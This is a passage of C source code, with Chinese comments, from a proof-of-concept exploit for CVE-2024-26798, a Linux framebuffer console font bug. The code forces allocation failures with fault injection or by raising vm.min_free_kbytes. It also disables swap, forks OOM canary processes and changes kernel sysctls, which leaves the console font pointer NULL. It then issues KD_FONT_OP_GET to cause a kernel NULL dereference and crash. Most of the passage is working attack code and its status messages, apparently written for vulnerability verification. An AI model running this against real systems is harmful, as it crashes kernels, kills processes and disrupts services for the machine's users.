     *       fbcon_flashcursor → console_lock() → fbcon_cursor(vc1, CUR_INVERT)
     *     loglevel=0 無法防止此路徑。若 fg_console=1 且 vc_font.data=NULL，
     *     cursor blink 仍會 crash。
     *
     * 解法：在記憶體充裕時（HugeTLB 壓力已建立，但 WMARK_MIN 尚未拉高）
     *     完成 VT 切換。切換後 fg_console=2；bug 觸發期間：
     *       - console_unlock() 輸出到 vc2（字型有效）
     *       - fb_flashcursor 檢查 con_is_visible(vc1) = false → 跳過
     *     兩條路徑都安全。
     */

    /* 儲存當前 printk 設定，設為 loglevel=0（備用保護） */
    char orig_printk[64] = "7\t4\t1\t7";
    {
        int pfd = open("/proc/sys/kernel/printk", O_RDONLY);
        if (pfd >= 0) {
            ssize_t n = read(pfd, orig_printk, sizeof(orig_printk) - 1);
            if (n > 0) orig_printk[n] = '\0';
            char *nl = strchr(orig_printk, '\n');
            if (nl) *nl = '\0';
            close(pfd);
        }
    }
    write_file("/proc/sys/kernel/printk", "0\t4\t1\t7");

    /*
     * 儲存並停用 vm.panic_on_oom。
     *
     * 原因：watermark 拉高 + swapoff 後，其他 process 的 page fault
     * （GFP_HIGHUSER_MOVABLE）無法回收記憶體，觸發 OOM killer。
     * 若 OOM killer 找不到可殺的 victim（本 process oom_score_adj=-1000），
     * 預設行為是 panic（即使 panic_on_oom=0 也可能因 HAKC kernel 差異）。
     * 暫時停用可讓 OOM killer 殺掉其他 process 而不 panic 整個系統。
     * 危險窗口結束（watermark 還原）後立即恢復原設定。
     */
    char orig_panic_on_oom[8] = "0";
    {
        int pfd = open("/proc/sys/vm/panic_on_oom", O_RDONLY);
        if (pfd >= 0) {
            ssize_t n = read(pfd, orig_panic_on_oom, sizeof(orig_panic_on_oom) - 1);
            if (n > 0) orig_panic_on_oom[n] = '\0';
            char *nl = strchr(orig_panic_on_oom, '\n');
            if (nl) *nl = '\0';
            close(pfd);
        }
    }
    write_file("/proc/sys/vm/panic_on_oom", "0");

    /*
     * 儲存並啟用 vm.oom_kill_allocating_task=1。
     *
     * 問題：OOM killer 預設走 select_bad_process() 全域搜尋。
     * 若 parent（oom_score_adj=-1000）是唯一存活 process，OOM 找不到 victim
     * → panic("Out of memory and no killable processes...")，即使 panic_on_oom=0。
     *
     * 解法：oom_kill_allocating_task=1 讓 OOM 優先殺「觸發本次分配的 task」。
     * child 的 oom_score_adj 已重設為 0（可被殺），所以 oom_badness() ≠ LONG_MIN
     * → child 被殺 → TIF_MEMDIE 設定 → 再次分配時 ALLOC_OOM → goto nopage
     * → kzalloc 回傳 NULL → ENOMEM → bug state ✓。
     * 同時防止 cascade（每次 OOM 只殺觸發者，不會一路殺到「無 victim」）。
     */
    char orig_oom_kill_alloc[8] = "0";
    {
        int pfd = open("/proc/sys/vm/oom_kill_allocating_task", O_RDONLY);
        if (pfd >= 0) {
            ssize_t n = read(pfd, orig_oom_kill_alloc, sizeof(orig_oom_kill_alloc) - 1);
            if (n > 0) orig_oom_kill_alloc[n] = '\0';
            char *nl = strchr(orig_oom_kill_alloc, '\n');
            if (nl) *nl = '\0';
            close(pfd);
        }
    }
    write_file("/proc/sys/vm/oom_kill_allocating_task", "1");
    fprintf(stderr, "[*] oom_kill_allocating_task → 1（OOM 優先殺觸發者，防 cascade panic）\n");
    int orig_vt_num = 1;
    int vt_switched = 0;
    {
        struct vt_stat vts;
        if (ioctl(fd, VT_GETSTATE, &vts) == 0)
            orig_vt_num = vts.v_active;
        int target_vt = (orig_vt_num == 1) ? 2 : 1;
        if (ioctl(fd, VT_ACTIVATE, target_vt) == 0 &&
            ioctl(fd, VT_WAITACTIVE, target_vt) == 0) {
            vt_switched = 1;
            fprintf(stderr, "[*] 切換至 VT%d（fg_console 離開 tty1）✓\n", target_vt);
        } else {
            fprintf(stderr, "[!] VT 切換失敗 (%s)，僅依賴 loglevel=0 保護\n",
                    strerror(errno));
        }
    }

    /*
     * OOM canary：在 watermark 設定之前 fork 一個輕量 child，
     * oom_score_adj=1000（最高，OOM 優先殺此 process）。
     *
     * 問題背景：
     *   watermark_child 透過 ENOMEM/SIGKILL 退出後，parent 恢復 watermark
     *   需要 <1ms。但若 sshd 恰好在此窗口發生 filemap_fault → OOM，
     *   此時 watermark_child 已死、sshd 本身 oom_score_adj=-1000（systemd 設定），
     *   select_bad_process 找不到 victim → panic("Out of memory and no killable processes")
     *   即使 panic_on_oom=0 也無法阻止（此路徑強制 panic）。
     *
     * 解法：canary 作為犧牲 victim：
     *   - OOM fires（sshd 觸發）→ canary 被殺（adj=1000 最優先）
     *   - canary 記憶體極小，無助於讓 sshd 的分配通過 WMARK_MIN，
     *     但能防止「no victim → panic」
     *   - parent 恢復 watermark 後，sshd 的下一次重試成功
     *   - watermark 恢復後立即 kill 掉 canary（若尚存活）
     *
     * 注意：危險窗口期間 OOM 持續觸發的原因：
     *
     *   窗口長度（order=4 costly path）：
     *     should_reclaim_retry() 對 order > PAGE_ALLOC_COSTLY_ORDER 直接回傳 false，
     *     故只有一輪 try_to_free_pages。96-CPU + 103 memcg 群組的系統上，
     *     shrink_lruvec/shrink_slab 迭代即使無可回收頁面也需 50–100ms。
     *
     *   kthreadd OOM 頻率：
     *     kthreadd order=2 stack（THREADINFO_GFP = GFP_KERNEL | __GFP_NORETRY）
     *     在 WMARK_MIN >> MemFree 時仍觸發 OOM；__GFP_NORETRY 不阻止非 costly
     *     order 的 OOM killer 路徑。OOM 後 schedule() + retry ≈ 5–10ms，
     *     50ms 窗口中約 5–10 次 OOM 事件。
     *
     *   DMA zone fallback（kthreadd 無法繞過）：
     *     lowmem_reserve_ratio[DMA]=1 封鎖所有對 DMA zone 的 fallback，
     *     副作用是 kthreadd 每次 retry 都必然觸發 OOM。
     *
     *   所需 canary 數：
     *     最壞情況 ceil(100ms / 5ms) = 20 次 OOM；乘以 10× 安全係數 = 200。
     *     每個 canary ~20KB 實體記憶體（COW 共享 parent 頁面），200 個共 ~4MB，
     *     對 ~2GB MemFree 環境可忽略。
     *
     * 以下 fork NUM_CANARIES 個 canary，每個 adj=1000，
     * 各自獨立吸收一次「no victim」OOM 事件，直到 watermark 恢復。
     */
    /*
     * 保護 parent 免遭 OOM killer 強制殺死（watermark 窗口期間）。
     * oom_badness() 對 adj=-1000 的任務返回 0，select_bad_process 完全跳過，
     * 確保即使所有 canary 耗盡，parent 仍能存活並恢復 watermark。
     * 根本原因（crash 202604220530）：parent (adj=0) 在 3 個 canary 全死後
     * 被 select_bad_process 殺死 → watermark 永遠無法還原 → panic。
     */
    if (write_file("/proc/self/oom_score_adj", "-1000") == 0)
        fprintf(stderr, "[*] parent oom_score_adj → -1000（OOM 保護已啟用）\n");
    else
        fprintf(stderr, "[!] 無法設定 parent oom_score_adj（繼續，風險略高）\n");

    /*
     * 保護 parent 免遭 SIGHUP 殺死（watermark 窗口期間）。
     * 根本原因（crash 202604220759）：sshd session 被 OOM killer 殺死 →
     * kernel 對前景進程組發送 SIGHUP → parent poc（adj=-1000，OOM 免疫）
     * 收到 SIGHUP 而死（exit_code=1）→ watermark 無法恢復 → panic。
     * 忽略 SIGHUP 確保 SSH session 斷開時 parent 繼續存活並完成清理。
     */
    signal(SIGHUP, SIG_IGN);
    fprintf(stderr, "[*] SIGHUP → SIG_IGN（SSH session 斷開保護已啟用）\n");

#define NUM_CANARIES 200
    pid_t oom_canary_pids[NUM_CANARIES];
    int oom_canary_count = 0;
    for (int ci = 0; ci < NUM_CANARIES; ci++) {
        pid_t c = fork();
        if (c == 0) {
            int afd = open("/proc/self/oom_score_adj", O_WRONLY);
            if (afd >= 0) { ssize_t _w = write(afd, "1000", 4); (void)_w; close(afd); }
            for (;;) pause();
            _exit(0);
        }
        if (c > 0) {
            oom_canary_pids[oom_canary_count++] = c;
        } else {
            fprintf(stderr, "[!] OOM canary %d fork 失敗: %s（繼續）\n", ci + 1, strerror(errno));
        }
    }

    fprintf(stderr, "[*] OOM canary 已啟動 %d/%d 個（oom_score_adj=1000）\n",
            oom_canary_count, NUM_CANARIES);

    /* 2. 暫停所有 swap 裝置 */
    struct swap_dev swap_devs[16];
    int swap_count = swapoff_all(swap_devs, 16);

    /* 3. 清除自上次 drop_caches 以來積累的 page cache（主因：crash/其他工具讀取大型 dump
     *    檔案，可能積累數百 MB file cache；直接回收路徑（GFP_USER slowpath）在
     *    WMARK_MIN 壓力下會主動回收這些頁面，使 Zone Normal free 超過 WMARK_MIN，
     *    導致 kzalloc 意外成功。再次 drop_caches 確保 MemFree 讀值精確，
     *    且後續直接回收無法大量釋放 file cache 來繞過 watermark。） */
    write_file("/proc/sys/vm/drop_caches", "3");
    usleep(100000);  /* 讓 kswapd 完成 drop */

    /* 4. 重新讀取 MemFree（swapoff 後 RAM 可能略有增加），更新 new_min_kb */
    if (used_hugepages && swap_count > 0) {
        long free_post_swap = read_mem_free_kb();
        if (free_post_swap > 0) {
            /*
             * ALLOC_OOM（OOM victim retry）將 WMARK_MIN 減半（min -= min/2）。
             * 需要 new_min/2 > free_post_swap，即 new_min > 2×free_post_swap。
             * 使用 3× 乘數留有額外安全邊距（抵抗 kswapd 回收 ~200 MB）：
             *   有效門檻 = new_min/2 = 1.5×free_post_swap > free_post_swap → ENOMEM ✓
             */
            new_min_kb = free_post_swap * 3;
            fprintf(stderr,
                    "[*] swapoff+drop_caches 後 MemFree=%ld MB，new_min 更新為 %ld MB\n",
                    free_post_swap / 1024, new_min_kb / 1024);
        }
    }

    /* 設定 watermark */
    char new_min_str[32];
    snprintf(new_min_str, sizeof(new_min_str), "%ld", new_min_kb);
    fprintf(stderr, "[*] KD_FONT_OP_SET (height=%u) — watermark 限制中...\n", target_h);
    if (write_file("/proc/sys/vm/min_free_kbytes", new_min_str) < 0) {
        fprintf(stderr, "[!] 設定 min_free_kbytes 失敗: %s\n", strerror(errno));
        __atomic_store_n(go_flag, 1, __ATOMIC_RELEASE); /* 讓 child 退出 */
        kill(wm_child, SIGKILL); waitpid(wm_child, NULL, 0);
        for (int ci = 0; ci < oom_canary_count; ci++) { kill(oom_canary_pids[ci], SIGKILL); waitpid(oom_canary_pids[ci], NULL, 0); }
        write_file("/proc/self/oom_score_adj", "0");
        munmap((void *)go_flag, 4096);
        write_file("/proc/sys/vm/panic_on_oom", orig_panic_on_oom);
        write_file("/proc/sys/vm/oom_kill_allocating_task", orig_oom_kill_alloc);
        swapon_all(swap_devs, swap_count);
        if (vt_switched) { ioctl(fd, VT_ACTIVATE, orig_vt_num); ioctl(fd, VT_WAITACTIVE, orig_vt_num); }
        write_file("/proc/sys/kernel/printk", orig_printk);
        if (blocked_dma) write_file("/proc/sys/vm/lowmem_reserve_ratio", orig_reserve_ratio);
        if (used_hugepages) release_hugepage_pressure(hp_orig);
        return -1;
    }

    long actual_min = read_min_free_kbytes();
    if (actual_min != new_min_kb) {
        fprintf(stderr, "[!] min_free_kbytes 未生效（讀回 %ld，預期 %ld）\n",
                actual_min, new_min_kb);
        write_file("/proc/sys/vm/min_free_kbytes", orig_min_str);
        __atomic_store_n(go_flag, 1, __ATOMIC_RELEASE);
        kill(wm_child, SIGKILL); waitpid(wm_child, NULL, 0);
        for (int ci = 0; ci < oom_canary_count; ci++) { kill(oom_canary_pids[ci], SIGKILL); waitpid(oom_canary_pids[ci], NULL, 0); }
        write_file("/proc/self/oom_score_adj", "0");
        munmap((void *)go_flag, 4096);
        write_file("/proc/sys/vm/panic_on_oom", orig_panic_on_oom);
        write_file("/proc/sys/vm/oom_kill_allocating_task", orig_oom_kill_alloc);
        swapon_all(swap_devs, swap_count);
        if (vt_switched) { ioctl(fd, VT_ACTIVATE, orig_vt_num); ioctl(fd, VT_WAITACTIVE, orig_vt_num); }
        write_file("/proc/sys/kernel/printk", orig_printk);
        if (blocked_dma) write_file("/proc/sys/vm/lowmem_reserve_ratio", orig_reserve_ratio);
        if (used_hugepages) release_hugepage_pressure(hp_orig);
        return -1;
    }

    /*
     * 發送 go 信號：直接寫入共享頁面，不分配任何 kernel 記憶體。
     * child 的 spin-wait 會在看到 go_flag=1 後執行 set_font()。
     */
    __atomic_store_n(go_flag, 1, __ATOMIC_RELEASE);

    /* 等待 child 完成 ioctl，然後立即還原 */
    int cstatus;
    waitpid(wm_child, &cstatus, 0);
    munmap((void *)go_flag, 4096);

    int got_enomem = WIFEXITED(cstatus) && WEXITSTATUS(cstatus) == 42;
    int got_success = WIFEXITED(cstatus) && WEXITSTATUS(cstatus) == 0;
    /* costly_order=TRUE 路徑：OOM killer 不會被呼叫；child 應正常 exit(42)。
     * 萬一系統有其他 OOM 壓力導致 child 被 SIGKILL，保守視為 got_enomem。 */
    if (WIFSIGNALED(cstatus) && WTERMSIG(cstatus) == SIGKILL) {
        fprintf(stderr, "[!] child 被 SIGKILL（非預期；costly_order 應不觸發 OOM）— 視為 bug state 達成\n");
        got_enomem = 1;
    }

    /*
     * 還原順序：watermark → font → swap → DMA reserve → oom_adj
     *
     * 關鍵：swapon() 會觸發 kernel printk（"Adding Xuk swap on ..."）。
     * printk 把訊息輸出到 framebuffer console（/dev/tty1），呼叫
     * fbcon_putcs() → 讀取 vc->vc_font.data。
     * 若 CVE bug state 已達成（vc_font.data == NULL），fbcon_putcs 會
     * 產生 NULL dereference → kernel panic。
     *
     * 修法：在 swapon_all() 之前先還原 watermark，再立即呼叫
     * set_default_font(fd)，把 vc_font.data 設回有效的內建字型指標，
     * 如此 swapon 的 printk 就不會崩潰。
     */
    write_file("/proc/sys/vm/min_free_kbytes", orig_min_str);
    write_file("/proc/sys/vm/panic_on_oom", orig_panic_on_oom);
    write_file("/proc/sys/vm/oom_kill_allocating_task", orig_oom_kill_alloc);

    /* watermark 已還原，canary 不再需要；若仍存活則清理 */
    for (int ci = 0; ci < oom_canary_count; ci++) {
        kill(oom_canary_pids[ci], SIGKILL);
        waitpid(oom_canary_pids[ci], NULL, 0);
    }
    oom_canary_count = 0;
    write_file("/proc/self/oom_score_adj", "0");
    fprintf(stderr, "[*] parent oom_score_adj → 0（OOM 保護已解除）\n");

    /*
     * ── CVE 觸發：GET while vc_font.data == NULL ──────────────────────
     *
     * 關鍵時序：watermark 已還原（free ≈ 2GB），vc_font.data 仍是 NULL。
     * 此處執行 KD_FONT_OP_GET → fbcon_get_font() → FNTSIZE(NULL)
     * → kernel page fault（vulnerable kernel crash / patched kernel 正常返回）。
     *
     * 必須在 set_default_font()（font 還原）之前執行，否則 vc_font.data
     * 已被修復，GET 不會觸發 NULL dereference。
     *
     * 用 fork 執行：若 kernel oops 不 panic，child 收到 SIGSEGV，
     * parent 偵測到後繼續安全還原；若 panic_on_oops=1，系統直接重啟。
     */
    if (got_enomem && do_get) {
        fprintf(stderr, "\n[*] Step 3: KD_FONT_OP_GET — vc_font.data=NULL，觸發 NULL dereference\n");
        fprintf(stderr, "[*]         watermark 已還原；vc_font.data 仍為 NULL\n");
        pid_t get_child = fork();
        if (get_child == 0) {
            trigger_get(fd, 1);
            _exit(0);   /* patched kernel: GET succeeded, exit normally */
        } else if (get_child > 0) {
            int gs;
            waitpid(get_child, &gs, 0);
            if (get_result) {
                if (WIFSIGNALED(gs) && WTERMSIG(gs) == SIGSEGV)
                    *get_result = 1;   /* SIGSEGV = oops triggered */
                else if (WIFEXITED(gs) && WEXITSTATUS(gs) == 0)
                    *get_result = 0;   /* normal exit = patched kernel */
                else
                    *get_result = -1;  /* unexpected */
            }
        } else {
            fprintf(stderr, "[!] fork GET child 失敗: %s\n", strerror(errno));
            trigger_get(fd, 1);  /* fallback: run in-process */
        }
    }

    int font_restored = 1;  /* assume safe; cleared if restore fails in bug state */
    if (got_enomem) {
        /*
         * CVE bug state 已達成（vc_font.data == NULL）。
         * 立即還原 font，防止後續任何 kernel printk（尤其 swapon）
         * 透過 fbcon 觸發 NULL dereference crash。
         *
         * set_default_font 使用 KD_FONT_OP_SET_DEFAULT，以內建字型
         * 呼叫 fbcon_do_set_font()，在進行 vc_resize() 之前即把
         * vc->vc_font.data 設為有效指標，故不會 crash。
         * 此時 watermark 已還原、free ≈ 2GB → 分配必然成功。
         */
        fprintf(stderr, "[+] 收到 ENOMEM — watermark 觸發，vc_resize() 失敗！\n");
        fprintf(stderr, "[+] vc_font.data 現在為 NULL（CVE bug state 達成）。\n");
        fprintf(stderr, "[*] 還原 font（防 swapon printk → fbcon NULL deref）...\n");
        if (set_default_font(fd) == 0) {
            fprintf(stderr, "[*] font 已還原，vc_font.data 有效 ✓\n");
        } else {
            fprintf(stderr, "[!] font 還原失敗: %s\n", strerror(errno));
            fprintf(stderr, "[!] vc_font.data 仍為 NULL — 跳過 swapon（其 printk 會 crash）\n");
            font_restored = 0;
        }
    }

    /* swapon() 觸發 kernel printk；若 vc_font.data 仍是 NULL 則跳過 */
    if (font_restored)
        swapon_all(swap_devs, swap_count);

    /* 還原 VT：font 有效後才切回，避免又以 NULL vc_font.data 接收 printk */
    if (vt_switched && font_restored) {
        if (ioctl(fd, VT_ACTIVATE, orig_vt_num) == 0 &&
            ioctl(fd, VT_WAITACTIVE, orig_vt_num) == 0)
            fprintf(stderr, "[*] 已切換回 VT%d ✓\n", orig_vt_num);
        else
            fprintf(stderr, "[!] 切回 VT%d 失敗 (%s)\n", orig_vt_num, strerror(errno));
    }

    /* 還原 printk console loglevel */
    write_file("/proc/sys/kernel/printk", orig_printk);
    if (blocked_dma) write_file("/proc/sys/vm/lowmem_reserve_ratio", orig_reserve_ratio);
    ofd = open("/proc/self/oom_score_adj", O_WRONLY);
    if (ofd >= 0) { ssize_t _ww = write(ofd, "0", 1); (void)_ww; close(ofd); }

    if (used_hugepages) {
        fprintf(stderr, "[*] 還原 HugeTLB 頁面...\n");
        release_hugepage_pressure(hp_orig);
    }

    if (got_enomem)
        return 0;
    if (got_success)
        fprintf(stderr, "[!] SET 成功 — MemFree > new_min 或 Zone DMA fallback 仍有效\n");
    else
        fprintf(stderr, "[!] SET 結束狀態異常（預期 ENOMEM）\n");
    return -1;
}

/* ── fail_page_alloc 設定／清除 ─────────────────────────────────────── */

static int fail_page_alloc_available(void)
{
    return access(FAIL_DIR "/probability", W_OK) == 0;
}

static void setup_fail_page_alloc(void)
{
    write_file(FAIL_DIR "/probability",     "100");
    write_file(FAIL_DIR "/interval",        "1");
    write_file(FAIL_DIR "/times",           "-1");
    write_file(FAIL_DIR "/space",           "0");
    write_file(FAIL_DIR "/min-order",       "0");
    write_file(FAIL_DIR "/ignore-gfp-wait", "0");
    write_file(FAIL_DIR "/task-filter",     "1");
    write_file(MAKE_FAIL, "1");
}

static void teardown_fail_page_alloc(void)
{
    write_file(MAKE_FAIL, "0");
    write_file(FAIL_DIR "/probability", "0");
    write_file(FAIL_DIR "/task-filter", "0");
}

/* ── font ioctl helpers ─────────────────────────────────────────────── */

static unsigned int probe_font_height(int fd)
{
    struct console_font_op op = {
        .op = KD_FONT_OP_GET, .width = 32, .height = 32, .charcount = 512, .data = NULL,
    };
    ioctl(fd, KDFONTOP, &op);
    return op.height ? op.height : 16;
}

/* KD_FONT_OP_SET_DEFAULT — reset to system font, sets p->userfont=0 */
static int set_default_font(int fd)
{
    struct console_font_op op = {
        .op = KD_FONT_OP_SET_DEFAULT, .flags = 0,
        .width = 0, .height = 0, .charcount = 0, .data = NULL,
    };
    return ioctl(fd, KDFONTOP, &op);
}

/* KD_FONT_OP_SET with given height; font_data must be FONT_DATA_SIZE(height) bytes */
static int set_font(int fd, unsigned int height, unsigned char *font_data)
{
    struct console_font_op op = {
        .op        = KD_FONT_OP_SET,
        .flags     = 0,
        .width     = FONT_WIDTH,
        .height    = height,
        .charcount = FONT_CHARCOUNT,
        .data      = font_data,
    };
    return ioctl(fd, KDFONTOP, &op);
}

/* ── 主觸發流程 ─────────────────────────────────────────────────────── */

/*
 * 利用 fail_page_alloc 觸發 CVE-2024-26798。
 * 成功回傳 0，失敗回傳 -1。
 */
static int trigger_via_fail_page_alloc(int fd)
{
    if (!fail_page_alloc_available()) {
        fprintf(stderr, "[!] fail_page_alloc debugfs not available.\n");
        fprintf(stderr, "    需要：CONFIG_FAULT_INJECTION_DEBUG_FS=y + CONFIG_FAIL_PAGE_ALLOC=y\n");
        return -1;
    }
    fprintf(stderr, "[+] fail_page_alloc debugfs available\n");

    /* ── Phase 1：確保 p->userfont=0 ── */
    if (set_default_font(fd) != 0) {
        fprintf(stderr, "[!] KD_FONT_OP_SET_DEFAULT failed: %s\n", strerror(errno));
        fprintf(stderr, "    繼續嘗試，但 p->userfont 可能不是 0\n");
    } else {
        fprintf(stderr, "[*] KD_FONT_OP_SET_DEFAULT → p->userfont=0\n");
    }

    /*
     * 選擇觸發用字型高度：
     *   使用最小合法高度 6px（rows 最多 → vc_resize 分配最大）。
     *   若系統字型恰好是 6px，改用 8px（確保 resize 會發生）。
     */
    unsigned int sys_h = probe_font_height(fd);
    unsigned int target_h = (sys_h == FONT_HEIGHT_MIN) ? FONT_HEIGHT_ALT : FONT_HEIGHT_MIN;
    fprintf(stderr, "[*] 系統字型高度=%u → 觸發用高度=%u\n", sys_h, target_h);

    /* font_data buffer（全零，vc_resize 失敗後不會真正被使用）*/
    size_t fdata_sz = FONT_DATA_SIZE(target_h);
    unsigned char *fdata = calloc(1, fdata_sz + 12); /* +12 for FONT_EXTRA_WORDS */
    if (!fdata) { log_error("calloc", errno); return -1; }

    /* ── Phase 2：Warm up slab cache ── */
    /*
     * 先做一次「不注入」的 SET(target_h)，讓 kmalloc-2048 slab cache 變熱：
     *   fbcon_set_font() 呼叫 kmalloc(font_data_size)，消耗 slab 中的一個 slot。
     * 接著 SET_DEFAULT 將此 slot 釋放回 slab（kfree in fbcon_do_set_font err path /
     * 正常 path）。下次同 size 的 kmalloc 直接從 slab 取用，不需 page allocation。
     *
     * 注意：SET 成功後 p->userfont=1，必須再做 SET_DEFAULT 重設回 0。
     */
    fprintf(stderr, "[*] Warm-up: SET(h=%u) 不注入 → 暖 slab cache...\n", target_h);
    if (set_font(fd, target_h, fdata) != 0) {
        fprintf(stderr, "[!] Warm-up SET failed: %s — 繼續（slab 可能仍冷）\n", strerror(errno));
    } else {
        fprintf(stderr, "[*] Warm-up SET 成功 (p->userfont=1)\n");
    }

    /* 重設 p->userfont=0；slab 中有被釋放的 free slot 可供下次使用 */
    if (set_default_font(fd) != 0) {
        fprintf(stderr, "[!] 第二次 SET_DEFAULT failed: %s\n", strerror(errno));
    } else {
        fprintf(stderr, "[*] SET_DEFAULT → p->userfont=0，slab warm ✓\n");
    }

    unsigned int cur_h = probe_font_height(fd);
    fprintf(stderr, "[*] 目前字型高度=%u（應為系統字型 %u）\n", cur_h, sys_h);

    /* ── Phase 3：啟用 fault injection，觸發 vc_resize 失敗 ── */
    fprintf(stderr, "[*] 啟用 fail_page_alloc (probability=100, task-filter=1, min-order=0)...\n");
    setup_fail_page_alloc();

    fprintf(stderr, "[*] KD_FONT_OP_SET (height=%u) — fault injection 進行中...\n", target_h);
    int r = set_font(fd, target_h, fdata);
    int e = errno;

    teardown_fail_page_alloc();
    free(fdata);

    if (r == 0) {
        fprintf(stderr, "[!] KD_FONT_OP_SET 成功 — vc_resize 未失敗。\n"
                "    可能原因：slab 仍冷（kmalloc 先被打中）或 vc_resize 分配太小。\n"
                "    請檢查 dmesg。\n");
        return -1;
    }
    if (e != ENOMEM) {
        fprintf(stderr, "[!] SET 回傳 %s (errno=%d)，預期 ENOMEM。\n", strerror(e), e);
        return -1;
    }

    fprintf(stderr, "[+] 收到 ENOMEM — vc_resize() 失敗，err_out 被觸發。\n");
    fprintf(stderr, "[+] vc_font.data 現在為 NULL（CVE bug state 達成）。\n");
    return 0;
}

/* ── KD_FONT_OP_GET 觸發器 ─────────────────────────────────────────── */

static void trigger_get(int fd, int in_bug_state)
{
    fprintf(stderr, "\n[*] Step 3: KD_FONT_OP_GET — 觸發 NULL dereference\n");
    if (in_bug_state)
        fprintf(stderr, "[*]         vc_font.data 應為 NULL，vulnerable kernel 應在此崩潰。\n");

    /* probe（data=NULL）*/
    struct console_font_op op_probe = {
        .op = KD_FONT_OP_GET, .width = 32, .height = 32, .charcount = 512, .data = NULL,
    };
    fprintf(stderr, "[*] Step 3a: probe GET (data=NULL)...\n");
    ioctl(fd, KDFONTOP, &op_probe);

    /* 完整 GET — 若 vc_font.data==NULL，FNTSIZE(NULL) → kernel page fault */
    unsigned int cc = op_probe.charcount ? op_probe.charcount : 512;
    unsigned char *buf = malloc(GET_FONT_DATA_MAX);
    if (!buf) { log_error("malloc", errno); return; }
    memset(buf, 0, GET_FONT_DATA_MAX);

    struct console_font_op op_get = {
        .op = KD_FONT_OP_GET, .flags = 0,
        .width = 32, .height = 32, .charcount = cc, .data = buf,
    };
    fprintf(stderr, "[*] Step 3b: full GET (buf=%p, charcount=%u)\n", (void *)buf, cc);
    fprintf(stderr, "[*]          <<< 此處應發生 kernel crash（vulnerable kernel）>>>\n");

    int ret = ioctl(fd, KDFONTOP, &op_get);
    if (ret != 0) {
        log_error("KD_FONT_OP_GET", errno);
    } else {
        fprintf(stderr, "[+] GET 成功：%ux%u charcount=%u\n",
                op_get.width, op_get.height, op_get.charcount);
        if (in_bug_state)
            fprintf(stderr,
                    "[!] GET 在 corruption 後仍然成功。\n"
                    "    請確認：\n"
                    "      1. dmesg 中是否有 oops（kernel 可能捕捉到但繼續執行）\n"
                    "      2. vc_resize 是否真的以 ENOMEM 失敗（而非其他原因）\n"
                    "      3. err_out 路徑是否確實存在於目前 kernel\n");
    }
    free(buf);
}

/* ── main ──────────────────────────────────────────────────────────── */

int main(int argc, char *argv[])
{
    const char *vt_device = DEFAULT_VT_DEVICE;
    int use_watermark = 0;
    int bug_state_only = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--watermark") == 0)
            use_watermark = 1;
        else if (strcmp(argv[i], "--bug-state-only") == 0)
            bug_state_only = 1;
        else
            vt_device = argv[i];
    }

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    printf("[*] CVE-2024-26798 PoC\n");
    printf("[*] fbcon_do_set_font(): system font not restored on vc_resize() failure\n");
    printf("[*] Target VT : %s\n", vt_device);
    printf("[*] PID       : %ld\n", (long)getpid());
    printf("[*] 觸發方式  : %s\n", use_watermark
           ? "vm.min_free_kbytes（production kernel，無需 kernel config）"
           : "fail_page_alloc → vm.min_free_kbytes（自動 fallback）");
    if (bug_state_only)
        printf("[*] 模式      : --bug-state-only（只驗證 bug state，不觸發 crash）\n");

    int fd = open(vt_device, O_RDWR);
    if (fd < 0) { log_error("open(vt_device)", errno); return 1; }
    fprintf(stderr, "[+] Opened %s (fd=%d)\n\n", vt_device, fd);

    fprintf(stderr, "[*] Step 2: 將 vc_font.data 設為 NULL\n");
    int ok;
    int get_result = -1;  /* -1=not performed, 0=patched(normal exit), 1=oops(SIGSEGV) */
    int get_done = 0;
    if (use_watermark) {
        ok = (trigger_via_watermark(fd, !bug_state_only, &get_result) == 0);
        get_done = ok && !bug_state_only;
    } else {
        /* 策略 A: fail_page_alloc debugfs */
        ok = (trigger_via_fail_page_alloc(fd) == 0);
        /* 策略 B fallback: vm.min_free_kbytes */
        if (!ok) {
            fprintf(stderr, "[*] fail_page_alloc 不可用，改用 vm.min_free_kbytes...\n");
            ok = (trigger_via_watermark(fd, !bug_state_only, &get_result) == 0);
            get_done = ok && !bug_state_only;
        }
    }

    if (!ok) {
        fprintf(stderr, "\n[!] 無法達成 bug state，仍嘗試 GET...\n");
        trigger_get(fd, ok);
        close(fd);
        return 1;
    }

    /*
     * --bug-state-only：只確認 bug state 達成，不呼叫 KD_FONT_OP_GET。
     * 適合系統會 panic 導致無法查看 dmesg 的情境。
     * ENOMEM 回傳本身即是漏洞成立的直接證明：
     *   fbcon_do_set_font() err_out 已執行 vc->vc_font.data = old_data = NULL。
     */
    if (bug_state_only) {
        fprintf(stderr,
            "\n"
            "╔══════════════════════════════════════════════════════════╗\n"
            "║  [BUG STATE CONFIRMED] CVE-2024-26798 bug state 達成！  ║\n"
            "║                                                          ║\n"
            "║  KD_FONT_OP_SET 回傳 ENOMEM：                           ║\n"
            "║    vc_resize() 失敗 → err_out 執行                      ║\n"
            "║    → vc->vc_font.data = old_data = NULL                 ║\n"
            "║                                                          ║\n"
            "║  此為 CVE-2024-26798 漏洞的直接證明。                   ║\n"
            "║  下一步 KD_FONT_OP_GET 將觸發 NULL dereference crash，  ║\n"
            "║  若要完整觸發請移除 --bug-state-only 旗標。             ║\n"
            "╚══════════════════════════════════════════════════════════╝\n");
        close(fd);
        return 0;
    }

    /*
     * GET 已在 trigger_via_watermark() 內部執行（vc_font.data=NULL 時）。
     * 直接根據 get_result 回報結果。
     *
     * 對於 fail_page_alloc 路徑（get_done=0），使用舊的 fork 方式在此執行。
     */
    int status = 0;
    if (!get_done) {
        /*
         * fail_page_alloc 路徑：GET 尚未執行，用 fork 觸發。
         * 在 CONFIG_OOPS_PANIC=n 的 kernel 上，NULL dereference 發生在 kernel 空間時：
         *   kernel oops → 印出 call trace → 傳送 SIGSEGV 給當前 process。
         */
        fprintf(stderr, "\n[*] fork() child 執行 KD_FONT_OP_GET...\n");
        pid_t child = fork();
        if (child < 0) {
            log_error("fork", errno);
            trigger_get(fd, ok);
            close(fd);
            return 0;
        }
        if (child == 0) {
            trigger_get(fd, ok);
            close(fd);
            _exit(0);
        }
        close(fd);
        waitpid(child, &status, 0);
        if (WIFSIGNALED(status) && WTERMSIG(status) == SIGSEGV)
            get_result = 1;
        else if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
            get_result = 0;
    } else {
        close(fd);
    }

    fprintf(stderr, "\n");
    if (get_result == 1) {
        fprintf(stderr,
            "╔══════════════════════════════════════════════════════════╗\n"
